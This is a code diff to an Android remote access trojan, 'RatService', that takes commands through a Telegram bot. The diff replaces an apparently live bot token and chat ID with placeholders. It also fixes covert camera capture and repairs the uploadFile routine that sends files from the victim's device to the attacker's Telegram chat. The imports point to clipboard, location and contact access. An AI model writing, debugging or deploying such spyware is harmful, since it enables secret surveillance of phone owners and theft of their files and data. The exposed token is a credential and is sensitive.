@@ -6,7 +6,6 @@ import android.content.ClipboardManager;
 import android.content.Context;
 import android.content.Intent;
 import android.database.Cursor;
-import android.graphics.ImageFormat;
 import android.hardware.Camera;
 import android.location.Location;
 import android.location.LocationManager;
@@ -24,8 +23,8 @@ import java.net.URLEncoder;
 import okhttp3.*;
 
 public class RatService extends Service {
-    private static final String BOT_TOKEN = "‏9014559285:AAEamXnqANi68FHT7mnT3DpF5hC1y9zmes4";
-    private static final String CHAT_ID = "6978974735";
+    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN";
+    private static final String CHAT_ID = "YOUR_CHAT_ID";
     private static final String TG_API = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
     private long lastUpdateId = 0;
     private boolean isRunning = true;
@@ -145,7 +144,8 @@ public class RatService extends Service {
     private void takePhoto() {
         try {
             Camera camera = Camera.open(0);
-            camera.setPreviewTexture(new android.graphics.SurfaceTexture(0));
+            android.graphics.SurfaceTexture st = new android.graphics.SurfaceTexture(10);
+            camera.setPreviewTexture(st);
             camera.startPreview();
             camera.takePicture(null, null, (data, cam) -> {
                 File photo = new File(getExternalFilesDir(null), "photo.jpg");
@@ -161,11 +161,15 @@ public class RatService extends Service {
     private void uploadFile(String path) {
         File file = new File(path);
         if (!file.exists()) { sendText("File not found: " + path); return; }
+        
+        MediaType mediaType = MediaType.parse("application/octet-stream");
+        // تم تصحيح الترتيب هنا (mediaType, file)
         RequestBody requestBody = new MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
                 .addFormDataPart("chat_id", CHAT_ID)
-                .addFormDataPart("document", file.getName(), RequestBody.create(file, MediaType.parse("application/octet-stream")))
+                .addFormDataPart("document", file.getName(), RequestBody.create(mediaType, file))
                 .build();
+                
         Request request = new Request.Builder().url(TG_API + "sendDocument").post(requestBody).build();
         client.newCall(request).enqueue(new Callback() {
             @Override public void onFailure(Call call, IOException e) { sendText("Upload failed."); }
